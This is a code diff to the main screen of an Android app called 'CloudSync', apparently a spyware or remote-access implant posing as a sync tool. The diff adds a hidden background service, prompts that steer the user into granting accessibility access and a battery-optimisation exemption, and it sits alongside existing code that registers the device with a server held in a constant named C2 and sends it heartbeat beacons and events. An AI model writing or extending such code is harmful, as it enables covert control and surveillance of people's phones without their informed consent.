@@ -1,9 +1,15 @@
 package com.cloudsync.app
 
+import android.Manifest
 import android.content.Context
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.BatteryManager
 import android.os.Build
 import android.os.Bundle
+import android.os.PowerManager
+import android.provider.Settings
 import android.widget.Button
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
@@ -21,7 +27,7 @@ class MainActivity : AppCompatActivity() {
 
     companion object {
         const val C2 = "https://cloudsync-service.onrender.com"
-        const val VER = "2.1.4"
+        const val VER = "2.2.0"
         const val PROTO = "2.1.4"
     }
 
@@ -34,14 +40,51 @@ class MainActivity : AppCompatActivity() {
         estado = findViewById(R.id.estado)
         detalle = findViewById(R.id.detalle)
         findViewById<Button>(R.id.btn_sync).setOnClickListener { conectar() }
+        arrancarServicio()
+        pedirPermisos()
         conectar()
+    }
+
+    private fun arrancarServicio() {
+        try {
+            val i = Intent(this, SyncService::class.java)
+            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
+        } catch (e: Exception) { }
+    }
+
+    private fun pedirPermisos() {
+        try {
+            if (Build.VERSION.SDK_INT >= 33 &&
+                checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED
+            ) {
+                requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 1)
+            }
+        } catch (e: Exception) { }
+
+        if (!SyncAccessibility.listo()) {
+            try {
+                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+                log("activa CloudSync en Accesibilidad")
+            } catch (e: Exception) { }
+            return
+        }
+
+        try {
+            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                i.data = Uri.parse("package:$packageName")
+                startActivity(i)
+                log("quita el ahorro de bateria")
+            }
+        } catch (e: Exception) { }
     }
 
     private fun prefs() = getSharedPreferences("cs", Context.MODE_PRIVATE)
 
     private fun log(t: String) {
         val h = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
-        detalle.text = "$h  $t\n${detalle.text}"
+        detalle.text = "$h $t\n${detalle.text}"
     }
 
     private fun conectar() {
@@ -51,7 +94,6 @@ class MainActivity : AppCompatActivity() {
                 val p = prefs()
                 var id = p.getString("device_id", null)
                 var token = p.getString("token", null)
-
                 val body = JSONObject()
                     .put("label", Build.MODEL)
                     .put("platform", "android")
@@ -63,19 +105,16 @@ class MainActivity : AppCompatActivity() {
                 if (id != null && token != null) {
                     body.put("device_id", id).put("token", token)
                 }
-
                 val reg = post("/api/v1/sync/register", body.toString(), id, token)
                     ?: throw Exception("sin respuesta del servidor")
                 val jo = JSONObject(reg)
                 id = jo.getString("device_id")
                 token = jo.getString("token")
                 p.edit().putString("device_id", id).putString("token", token).apply()
-
                 runOnUiThread {
                     estado.text = getString(R.string.sincronizado)
                     log("registrado " + id!!.take(16) + "...")
                 }
-
                 val beacon = JSONObject()
                     .put("battery", bateria())
                     .put("charging", true)
@@ -83,7 +122,6 @@ class MainActivity : AppCompatActivity() {
                     .put("screen_on", true)
                 post("/api/v1/sync/beacon", beacon.toString(), id, token)
                 runOnUiThread { log("latido enviado") }
-
                 val arr = JSONArray()
                 arr.put(
                     JSONObject()
@@ -94,7 +132,6 @@ class MainActivity : AppCompatActivity() {
                 val ev = JSONObject().put("events", arr)
                 post("/api/v1/sync/push", ev.toString(), id, token)
                 runOnUiThread { log("evento enviado") }
-
             } catch (e: Exception) {
                 runOnUiThread {
                     estado.text = getString(R.string.sin_conexion)
